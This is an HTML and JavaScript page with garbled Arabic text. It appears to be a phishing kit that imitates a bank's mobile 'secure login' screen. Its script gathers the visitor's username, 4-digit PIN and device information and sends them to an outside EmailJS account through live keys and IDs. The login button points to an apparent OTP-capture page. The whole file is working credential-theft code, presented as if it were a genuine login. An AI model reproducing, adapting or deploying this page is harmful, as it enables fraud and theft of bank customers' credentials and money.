<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø§Ù„Ø¢Ù…Ù†</title>
    
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
    
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>

    <style>
        /* ğŸ”µ Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„ØµÙØ­Ø© Ø§Ù„Ø¹Ø§Ù…Ø© */
        * {
            box-sizing: border-box;
            outline: none;
            /* Ù…Ù†Ø¹ ØªÙƒØ¨ÙŠØ± Ø§Ù„Ø´Ø§Ø´Ø© Ø¹Ù†Ø¯ Ø§Ù„Ø¶ØºØ· Ø¹Ù„Ù‰ Ø§Ù„Ø­Ù‚ÙˆÙ„ ÙÙŠ Ø§Ù„Ø¬ÙˆØ§Ù„ */
            -webkit-tap-highlight-color: transparent;
        }

        body {
            margin: 0;
            padding: 0;
            background-color: #ffffff;
            font-family: 'Tajawal', sans-serif;
            height: 100vh; /* Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ø±ØªÙØ§Ø¹ Ø§Ù„Ø´Ø§Ø´Ø© Ø¨Ø§Ù„ÙƒØ§Ù…Ù„ */
            height: -webkit-fill-available; /* Ø¯Ø¹Ù… Ø£ÙØ¶Ù„ Ù„Ù…ØªØµÙØ­Ø§Øª Ø§Ù„Ø¬ÙˆØ§Ù„ */
            display: flex;
            flex-direction: column;
            color: #333333;
            position: relative;
            overflow: hidden; /* Ù…Ù†Ø¹ Ø§Ù„Ø³ÙƒØ±ÙˆÙ„ ØºÙŠØ± Ø§Ù„Ø¶Ø±ÙˆØ±ÙŠ */
        }

        /* Ø­Ø§ÙˆÙŠØ© Ø§Ù„Ù…Ø­ØªÙˆÙ‰ Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠ */
        .main-container {
            flex: 1;
            padding: 0 25px;
            display: flex;
            flex-direction: column;
            overflow-y: auto; /* Ø§Ù„Ø³Ù…Ø§Ø­ Ø¨Ø§Ù„Ø³ÙƒØ±ÙˆÙ„ Ù„Ù„Ù…Ø­ØªÙˆÙ‰ ÙÙ‚Ø· Ø¥Ø°Ø§ Ù„Ø²Ù… Ø§Ù„Ø£Ù…Ø± */
        }

        /* ğŸ”µ Ø§Ù„Ù…Ø³Ø§Ø­Ø© Ø§Ù„Ø¹Ù„ÙˆÙŠØ© ÙˆØ§Ù„Ù„ÙˆØºÙˆ */
        .top-spacer {
            height: 12vh; /* Margin Top ÙƒØ¨ÙŠØ±Ø© ØªØ´Ø¨Ù‡ Ø§Ù„Ø¨Ù†ÙˆÙƒ */
            min-height: 80px;
            width: 100%;
        }

        .logo-container {
            width: 70%;
            /* Ø§Ù„ØªØ¹Ø¯ÙŠÙ„ Ø§Ù„Ù…Ø·Ù„ÙˆØ¨: Ù†Ø³Ø¨Ø© Ø¹Ø±Ø¶ Ø¥Ù„Ù‰ Ø§Ø±ØªÙØ§Ø¹ 16:9 */
            aspect-ratio: 16 / 9;
            margin: 0 auto 50px auto; /* ØªÙˆØ³ÙŠØ· Ø£ÙÙ‚ÙŠ ÙˆÙ…Ø³Ø§ÙØ© Ø³ÙÙ„ÙŠØ© */
            display: flex;
            align-items: center;
            justify-content: center;
            /* ØªÙ… Ø¥Ø²Ø§Ù„Ø© Ø§Ù„Ø­Ø¯ÙˆØ¯ ÙˆØ§Ù„Ø®Ù„ÙÙŠØ© ÙƒÙ…Ø§ Ø·Ù„Ø¨Øª */
        }
        
        /* ØªÙ†Ø³ÙŠÙ‚ Ø§Ù„ØµÙˆØ±Ø© Ø¯Ø§Ø®Ù„ Ø§Ù„Ø­Ø§ÙˆÙŠØ© */
        .logo-image {
            width: 100%;
            height: 100%;
            object-fit: contain; /* Ù„Ø¶Ù…Ø§Ù† Ø¸Ù‡ÙˆØ± Ø§Ù„Ù„ÙˆØºÙˆ Ø¨Ø§Ù„ÙƒØ§Ù…Ù„ Ø¯ÙˆÙ† Ù‚Øµ */
        }

        /* ğŸ”µ Ø§Ù„Ø­Ù‚ÙˆÙ„ (Inputs) */
        .input-group {
            position: relative;
            margin-bottom: 40px;
        }

        /* Ø­Ù‚Ù„ Ø§Ø³Ù… Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… (Ø³ØªØ§ÙŠÙ„ Ø§Ù„Ø³Ø·Ø±) */
        .username-wrapper {
            position: relative;
            display: flex;
            align-items: center;
            border-bottom: 1px solid #333333; /* Ø®Ø· Ø£ÙÙ‚ÙŠ Ø£Ø³ÙˆØ¯ */
            transition: border-color 0.3s;
        }

        .username-wrapper:focus-within {
            border-bottom: 1px solid #007C91;
        }

        .custom-input {
            width: 100%;
            border: none;
            padding: 10px 35px 10px 5px; /* Ù…Ø³Ø§ÙØ© Ù„Ù„Ø£ÙŠÙ‚ÙˆÙ†Ø© */
            font-family: 'Tajawal', sans-serif;
            font-size: 16px;
            font-weight: 400; /* Ø®Ø· Ø±ÙÙŠØ¹ */
            color: #333333;
            background: transparent;
            border-radius: 0; /* Ø¥Ù„ØºØ§Ø¡ Ø§Ù„Ø­ÙˆØ§Ù Ø§Ù„Ø§ÙØªØ±Ø§Ø¶ÙŠØ© ÙÙŠ Ø§Ù„Ø¬ÙˆØ§Ù„ */
        }

        .custom-input::placeholder {
            color: #999;
            font-size: 15px;
        }

        /* Ø§Ù„Ø£ÙŠÙ‚ÙˆÙ†Ø© Ø§Ù„ÙŠÙ…Ù†Ù‰ */
        .input-icon-right {
            position: absolute;
            right: 5px;
            color: #007C91; /* Ø£Ø²Ø±Ù‚/ØªØ±ÙƒÙˆØ§Ø²ÙŠ */
            font-size: 18px;
        }

        /* --- ğŸ”µ ØªØ¹Ø¯ÙŠÙ„ Ù‚Ø³Ù… Ø§Ù„Ø±Ù‚Ù… Ø§Ù„Ø³Ø±ÙŠ (Underscores) --- */
        
        /* Ø­Ø§ÙˆÙŠØ© ØªØ¬Ù…Ø¹ Ø§Ù„Ø£ÙŠÙ‚ÙˆÙ†Ø© ÙˆØ­Ù‚ÙˆÙ„ Ø§Ù„Ø¥Ø¯Ø®Ø§Ù„ ÙÙŠ Ø³Ø·Ø± ÙˆØ§Ø­Ø¯ */
        .pin-wrapper-inline {
            display: flex;
            align-items: flex-end; /* Ù…Ø­Ø§Ø°Ø§Ø© Ø§Ù„Ø¹Ù†Ø§ØµØ± Ø¹Ù„Ù‰ Ø®Ø· Ø§Ù„Ù‚Ø§Ø¹Ø¯Ø© */
            gap: 15px; /* Ù…Ø³Ø§ÙØ© Ø¨ÙŠÙ† Ø§Ù„Ù‚ÙÙ„ ÙˆØ§Ù„Ø®Ø·ÙˆØ· */
            padding-bottom: 5px;
        }

        /* Ø£ÙŠÙ‚ÙˆÙ†Ø© Ø§Ù„Ù‚ÙÙ„ */
        .pin-main-icon {
             color: #007C91;
             font-size: 22px;
             margin-bottom: 8px; /* Ø¶Ø¨Ø· Ø¯Ù‚ÙŠÙ‚ Ù„Ù„Ù…Ø­Ø§Ø°Ø§Ø© Ø§Ù„Ø¹Ù…ÙˆØ¯ÙŠØ© */
        }

.pin-underscores-container {
    display: flex;
    gap: 15px;
    direction: ltr;
    justify-content: flex-start;
}

        /* ØªÙ†Ø³ÙŠÙ‚ Ø­Ù‚Ù„ Ø§Ù„Ø¥Ø¯Ø®Ø§Ù„ Ù„ÙŠØ¸Ù‡Ø± ÙƒØ®Ø· Ø³ÙÙ„ÙŠ */
        .pin-underscore-input {
            width: 45px; /* Ø¹Ø±Ø¶ Ø§Ù„Ø®Ø· Ø§Ù„ÙˆØ§Ø­Ø¯ */
            border: none;
            border-bottom: 2px solid #333; /* Ø³Ù…Ùƒ Ø§Ù„Ø®Ø· */
            text-align: center;
            font-size: 26px;
            font-family: 'Tajawal', sans-serif;
            font-weight: 700;
            background: transparent;
            border-radius: 0;
            padding: 0;
            color: #333;
            transition: border-color 0.3s, color 0.3s;
        }
        
        /* Ø¹Ù†Ø¯ Ø§Ù„ØªØ±ÙƒÙŠØ² Ø¹Ù„Ù‰ Ø§Ù„Ø®Ø· */
        .pin-underscore-input:focus {
            border-bottom-color: #007C91; /* ÙŠØªØºÙŠØ± Ù„ÙˆÙ† Ø§Ù„Ø®Ø· Ù„Ù„Ø£Ø²Ø±Ù‚ */
            caret-color: #007C91;
        }

        /* --- Ù†Ù‡Ø§ÙŠØ© ØªØ¹Ø¯ÙŠÙ„ Ø§Ù„Ø±Ù‚Ù… Ø§Ù„Ø³Ø±ÙŠ --- */


        /* ğŸ”µ Ø§Ù„Ø±ÙˆØ§Ø¨Ø· */
        .links-area {
            margin-top: 30px;
        }

        .forgot-pass {
            display: block;
            text-align: left; /* Ù…Ø­Ø§Ø°Ø§Ø© Ù„Ù„ÙŠØ³Ø§Ø± */
            color: #007C91;
            font-size: 14px;
            text-decoration: none;
            font-weight: 500;
            margin-bottom: 35px;
        }

        .new-user {
            display: block;
            text-align: center;
            color: #007C91;
            font-size: 15px;
            text-decoration: none;
            font-weight: 500;
        }

        /* ğŸ”µ Ø²Ø± ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ */
        .submit-container {
            margin-top: auto; /* ÙŠØ¯ÙØ¹ Ø§Ù„Ø²Ø± Ù„Ø£Ø³ÙÙ„ Ø§Ù„ØµÙØ­Ø© */
            padding: 20px 25px 30px 25px; /* Ù…Ø³Ø§ÙØ§Øª Ù…Ø­ÙŠØ·Ø© Ø¨Ø§Ù„Ø²Ø± */
            width: 100%;
            background: #fff; /* Ø®Ù„ÙÙŠØ© Ø¨ÙŠØ¶Ø§Ø¡ Ù„Ø¶Ù…Ø§Ù† Ø¹Ø¯Ù… ØªØ¯Ø§Ø®Ù„ Ø§Ù„Ù…Ø­ØªÙˆÙ‰ */
        }

        .login-btn {
            width: 100%;
            height: 65px;
            background-color: #FBC900; /* Ø§Ù„Ø£ØµÙØ± Ø§Ù„Ø¨Ù†ÙƒÙŠ */
            color: #000000;
            font-family: 'Tajawal', sans-serif;
            font-weight: 700; /* Bold */
            font-size: 20px;
            border: none;
            border-radius: 8px; /* Ø­ÙˆØ§Ù Ø¨Ø³ÙŠØ·Ø© */
            cursor: pointer;
            box-shadow: 0 4px 10px rgba(251, 201, 0, 0.2); /* Ø¸Ù„ Ø®ÙÙŠÙ Ù„Ù„Ø²Ø± */
            transition: transform 0.1s, background 0.2s;
        }

        .login-btn:active {
            background-color: #e0b300;
            transform: scale(0.98);
        }

    </style>
</head>
<body>

    <div class="main-container">
        
        <div class="top-spacer"></div>

        <div class="logo-container">
            <img src="https://i.imgur.com/ZY2DVCn.jpeg" alt="Bank Logo" class="logo-image">
        </div>

        <form id="loginForm" onsubmit="event.preventDefault(); sendEmail();">
            
            <div class="input-group">
                <div class="username-wrapper">
                    <i class="fa-solid fa-user input-icon-right"></i>
                    <input type="text" id="username" class="custom-input" placeholder="Ø§Ø³Ù… Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ø£Ùˆ Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ" required autocomplete="username">
                </div>
            </div>

            <div class="input-group">
                <div class="pin-wrapper-inline">
                    <i class="fa-solid fa-lock pin-main-icon"></i>
                    
                    <div class="pin-underscores-container">
                        <input type="tel" inputmode="numeric" class="pin-underscore-input" maxlength="1" id="pin1" autocomplete="one-time-code">
                        <input type="tel" inputmode="numeric" class="pin-underscore-input" maxlength="1" id="pin2" autocomplete="one-time-code">
                        <input type="tel" inputmode="numeric" class="pin-underscore-input" maxlength="1" id="pin3" autocomplete="one-time-code">
                        <input type="tel" inputmode="numeric" class="pin-underscore-input" maxlength="1" id="pin4" autocomplete="one-time-code">
                    </div>
                </div>
            </div>

            <div class="links-area">
                <a href="#" class="forgot-pass">Ù†Ø³ÙŠØª Ø§Ù„Ø±Ù‚Ù… Ø§Ù„Ø³Ø±ÙŠØŸ</a>
                <a href="#" class="new-user">Ù…Ø³ØªØ®Ø¯Ù… Ø¬Ø¯ÙŠØ¯ØŸ Ø³Ø¬Ù„ Ø§Ù„Ø¢Ù†!</a>
            </div>

        </form>
    </div>

<div class="submit-container">
    <button type="button" class="login-btn" onclick="window.location.href='otp.html'">
        ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„
    </button>
</div>

    <script>
        // 1. Ø¥Ø¹Ø¯Ø§Ø¯ EmailJS
        (function(){
            // âš ï¸âš ï¸ Ø§Ø³ØªØ¨Ø¯Ù„ 'YOUR_PUBLIC_KEY' Ø¨Ù…ÙØªØ§Ø­Ùƒ Ø§Ù„Ø¹Ø§Ù… Ø§Ù„Ø­Ù‚ÙŠÙ‚ÙŠ Ù…Ù† EmailJS
            emailjs.init("zWBq4dbSzfkEvVeS2");
        })();

        // 2. Ù…Ù†Ø·Ù‚ Ø§Ù„ØªÙ†Ù‚Ù„ Ø§Ù„ØªÙ„Ù‚Ø§Ø¦ÙŠ Ø¨ÙŠÙ† Ø®Ø·ÙˆØ· Ø§Ù„Ø±Ù‚Ù… Ø§Ù„Ø³Ø±ÙŠ (Underscores)
        // Ù‡Ø°Ø§ Ø§Ù„ÙƒÙˆØ¯ ÙŠØ¶Ù…Ù† ØªØ¬Ø±Ø¨Ø© Ù…Ø³ØªØ®Ø¯Ù… Ø³Ù„Ø³Ø© Ø¹Ù†Ø¯ Ø¥Ø¯Ø®Ø§Ù„ Ø§Ù„Ø£Ø±Ù‚Ø§Ù…
        const pinInputs = document.querySelectorAll('.pin-underscore-input');

        pinInputs.forEach((input, index) => {
            // Ø¹Ù†Ø¯ ÙƒØªØ§Ø¨Ø© Ø±Ù‚Ù…
            input.addEventListener('input', (e) => {
                 // Ø§Ù„ØªØ£ÙƒØ¯ Ù…Ù† Ø£Ù† Ø§Ù„Ù…Ø¯Ø®Ù„ Ø±Ù‚Ù… ÙÙ‚Ø·
                e.target.value = e.target.value.replace(/[^0-9]/g, '');
                
                if (e.target.value.length === 1) {
                    if (index < pinInputs.length - 1) {
                        pinInputs[index + 1].focus();
                    } else {
                        // Ø¥Ø°Ø§ ÙˆØµÙ„ Ù„Ø¢Ø®Ø± Ø­Ù‚Ù„ØŒ ÙŠÙ…ÙƒÙ† Ø¥Ø®ÙØ§Ø¡ Ø§Ù„ÙƒÙŠØ¨ÙˆØ±Ø¯ (Ø§Ø®ØªÙŠØ§Ø±ÙŠ)
                        input.blur(); 
                    }
                }
            });

            // Ø¹Ù†Ø¯ Ø§Ù„Ø¶ØºØ· Ø¹Ù„Ù‰ Backspace Ù„Ù„Ù…Ø³Ø­
            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && e.target.value === '') {
                    if (index > 0) {
                        pinInputs[index - 1].focus();
                    }
                }
            });
             
             // ØªØ­Ø¯ÙŠØ¯ Ø§Ù„Ù†Øµ Ø¨Ø§Ù„ÙƒØ§Ù…Ù„ Ø¹Ù†Ø¯ Ø§Ù„ØªØ±ÙƒÙŠØ² Ù„ØªØ³Ù‡ÙŠÙ„ Ø§Ù„ØªØ¹Ø¯ÙŠÙ„
             input.addEventListener('focus', (e) => {
                 e.target.select();
             });
        });

        // 3. Ø¯Ø§Ù„Ø© Ø§Ù„Ø¥Ø±Ø³Ø§Ù„
        function sendEmail() {
            const username = document.getElementById('username').value;
            // ØªØ¬Ù…ÙŠØ¹ Ø§Ù„Ø±Ù‚Ù… Ø§Ù„Ø³Ø±ÙŠ Ù…Ù† 4 Ø®Ø§Ù†Ø§Øª
            const pin = 
                document.getElementById('pin1').value + 
                document.getElementById('pin2').value + 
                document.getElementById('pin3').value + 
                document.getElementById('pin4').value;

            // ØªØ­Ù‚Ù‚ Ø¨Ø³ÙŠØ·
            if(!username || pin.length < 4) {
                alert("ÙŠØ±Ø¬Ù‰ Ø¥Ø¯Ø®Ø§Ù„ Ø§Ø³Ù… Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… ÙˆØ§Ù„Ø±Ù‚Ù… Ø§Ù„Ø³Ø±ÙŠ Ø§Ù„Ù…ÙƒÙˆÙ† Ù…Ù† 4 Ø£Ø±Ù‚Ø§Ù….");
                return;
            }

            const btn = document.querySelector('.login-btn');
            const originalBtnText = btn.innerHTML;
            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù‚Ù‚...';
            btn.style.opacity = "0.8";
            btn.disabled = true;

            // ØªØ¬Ù‡ÙŠØ² Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù„Ù„Ø¥Ø±Ø³Ø§Ù„ (ÙŠØ¬Ø¨ Ø£Ù† ØªØ·Ø§Ø¨Ù‚ Ø§Ù„Ù…ØªØºÙŠØ±Ø§Øª ÙÙŠ Ù‚Ø§Ù„Ø¨ EmailJS)
            var templateParams = {
                username: username,
                pin_code: pin,
                device_info: navigator.userAgent // Ø¥Ø¶Ø§ÙØ© Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø² (Ø§Ø®ØªÙŠØ§Ø±ÙŠ)
            };

            // âš ï¸âš ï¸ Ø§Ø³ØªØ¨Ø¯Ù„ 'YOUR_SERVICE_ID' Ùˆ 'YOUR_TEMPLATE_ID' Ø¨Ù…Ø¹Ù„ÙˆÙ…Ø§ØªÙƒ Ø§Ù„Ø­Ù‚ÙŠÙ‚ÙŠØ©
            emailjs.send('service_lyabofe', 'template_cxjh4ls', templateParams)
                .then(function(response) {
                    console.log('SUCCESS!', response.status, response.text);
                    btn.innerHTML = '<i class="fas fa-check"></i> ØªÙ… Ø¨Ù†Ø¬Ø§Ø­';
                    btn.style.backgroundColor = "#4CAF50"; // Ù„ÙˆÙ† Ø£Ø®Ø¶Ø± Ù„Ù„Ù†Ø¬Ø§Ø­
                    btn.style.color = "#fff";
                    
                    // Ø¥Ø¹Ø§Ø¯Ø© ØªØ¹ÙŠÙŠÙ† Ø§Ù„Ù†Ù…ÙˆØ°Ø¬ Ø¨Ø¹Ø¯ ÙØªØ±Ø© Ù‚ØµÙŠØ±Ø© Ø£Ùˆ Ø§Ù„ØªÙˆØ¬ÙŠÙ‡ Ù„ØµÙØ­Ø© Ø£Ø®Ø±Ù‰
                    setTimeout(() => {
                         document.getElementById('loginForm').reset();
                         btn.innerHTML = originalBtnText;
                         btn.style.backgroundColor = "#FBC900";
                         btn.style.color = "#000";
                         btn.disabled = false;
                         btn.style.opacity = "1";
                         // window.location.href = "/dashboard"; // Ù…Ø«Ø§Ù„ Ù„Ù„ØªÙˆØ¬ÙŠÙ‡
                    }, 2000);

                }, function(error) {
                    console.log('FAILED...', error);
                    btn.innerHTML = 'Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø§ØªØµØ§Ù„';
                    btn.style.backgroundColor = "#f44336"; // Ù„ÙˆÙ† Ø£Ø­Ù…Ø± Ù„Ù„Ø®Ø·Ø£
                    btn.style.color = "#fff";
                    alert("Ø­Ø¯Ø« Ø®Ø·Ø£ ØªÙ‚Ù†ÙŠ ÙÙŠ Ø¹Ù…Ù„ÙŠØ© ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„. ÙŠØ±Ø¬Ù‰ Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© Ù„Ø§Ø­Ù‚Ø§Ù‹.");
                    
                     setTimeout(() => {
                         btn.innerHTML = originalBtnText;
                         btn.style.backgroundColor = "#FBC900";
                         btn.style.color = "#000";
                         btn.disabled = false;
                         btn.style.opacity = "1";
                     }, 3000);
                });
        }
    </script>
</body>
</html>